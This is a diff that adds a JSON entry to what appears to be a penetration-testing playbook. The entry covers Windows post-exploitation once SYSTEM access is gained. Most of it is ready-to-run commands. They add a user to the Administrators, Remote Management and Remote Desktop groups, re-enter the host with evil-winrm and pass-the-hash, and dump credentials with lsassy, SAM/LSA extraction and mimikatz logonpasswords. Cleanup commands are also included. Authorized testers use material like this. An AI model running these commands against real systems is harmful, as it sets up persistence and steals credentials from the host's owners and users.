@@ -1,0 +1,30 @@
+{
+  "id": "local_admin_add",
+  "phase": "POST",
+  "title": "Add User to Local Administrators — Post-SYSTEM Persistence",
+  "body": "Once you have SYSTEM (from a potato attack, cron job, service hijack, or any other privesc), adding your low-priv user to the local Administrators group is the move that makes the rest of the box easy. It means you can re-enter via WinRM or SMB as that user without ever re-running the privesc — and nxc will show (Pwn3d!) so you can dump hashes cleanly.\n\nThis is a quality-of-life step, not the final objective. Do it while you have SYSTEM so the rest of the engagement doesn't depend on keeping a fragile shell alive. On a real engagement, document it and remove it when you're done — it's a material change to the environment.\n\nTwo main uses: (1) you got SYSTEM via a one-shot method (potato, cron, etc.) and the shell is fragile — promote your user so you can work cleanly. (2) you have domain creds but no local admin on a box — after privesc, add yourself so lsassy and secretsdump work without fighting the shell.",
+  "cmd": "# ══════════════════════════════════════════════════\n# 1 — ADD USER TO LOCAL ADMINISTRATORS\n# ══════════════════════════════════════════════════\n# Classic (cmd.exe / PowerShell):\nnet localgroup Administrators <DOMAIN>\\<USER> /add\n# or for a local account:\nnet localgroup Administrators <USER> /add\n\n# PowerShell equivalent:\nAdd-LocalGroupMember -Group 'Administrators' -Member '<DOMAIN>\\<USER>'\n\n# Verify it took:\nnet localgroup Administrators\nGet-LocalGroupMember Administrators\n\n# ══════════════════════════════════════════════════\n# 2 — RE-ENTER CLEANLY (new session picks up the membership)\n# ══════════════════════════════════════════════════\n# Group membership is applied at LOGON — your current token doesn't change.\n# You need a new session for (Pwn3d!) to appear and admin actions to work.\n\n# Confirm from Kali (nxc picks up the new membership):\nnxc smb <IP> -u <USER> -p '<PASS>' -d <DOMAIN>       # should show (Pwn3d!)\nnxc smb <IP> -u <USER> -H <NTHASH> -d <DOMAIN>       # or pass-the-hash\n\n# Re-enter via WinRM:\nevil-winrm -i <IP> -u <USER> -p '<PASS>'\nevil-winrm -i <IP> -u <USER> -H <NTHASH>              # pass-the-hash\n\n# ══════════════════════════════════════════════════\n# 3 — NOW DUMP CREDS CLEANLY\n# ══════════════════════════════════════════════════\n# From Kali with the promoted user:\nnxc smb <IP> -u <USER> -p '<PASS>' -M lsassy\nnxc smb <IP> -u <USER> -H <NTHASH> --sam\nnxc smb <IP> -u <USER> -H <NTHASH> --lsa\n\n# Or from inside the WinRM session (evil-winrm):\nUpload mimikatz.exe\n./mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'\n\n# ══════════════════════════════════════════════════\n# 4 — ADD TO REMOTE MANAGEMENT USERS (for WinRM without Pwn3d!)\n# ══════════════════════════════════════════════════\n# If you want WinRM access but NOT local admin (lower profile):\nnet localgroup \"Remote Management Users\" <DOMAIN>\\<USER> /add\n# Verify: Get-LocalGroupMember \"Remote Management Users\"\n\n# ══════════════════════════════════════════════════\n# 5 — ADD TO REMOTE DESKTOP USERS (for RDP access)\n# ══════════════════════════════════════════════════\nnet localgroup \"Remote Desktop Users\" <DOMAIN>\\<USER> /add\n# Then: xfreerdp3 /u:<USER> /p:<PASS> /d:<DOMAIN> /v:<IP> /cert:ignore\n\n# ══════════════════════════════════════════════════\n# 6 — CLEANUP (real engagements)\n# ══════════════════════════════════════════════════\nnet localgroup Administrators <DOMAIN>\\<USER> /delete\nnet localgroup \"Remote Management Users\" <DOMAIN>\\<USER> /delete\nGet-LocalGroupMember Administrators    # confirm removed",
+  "warn": "Group membership applies at the next logon — your current shell token does NOT change after the add. You need a fresh session (new evil-winrm, new SMB connection) before (Pwn3d!) shows up or admin actions work. On a real engagement this is a material environment change — document it and clean up with the /delete command when done. In a domain context, use DOMAIN\\user format or the add silently applies to a local account that may not exist.",
+  "choices": [
+    {
+      "label": "Dump creds — lsassy / SAM / LSA",
+      "next": "windows_creds"
+    },
+    {
+      "label": "Re-enter via WinRM with the promoted user",
+      "next": "winrm_access"
+    },
+    {
+      "label": "Spray the creds/hashes on internal subnet",
+      "next": "pth"
+    },
+    {
+      "label": "Got proof — pivot to next host",
+      "next": "got_root_windows"
+    },
+    {
+      "label": "Back to post-exploitation",
+      "next": "windows_post_exploit"
+    }
+  ]
+}
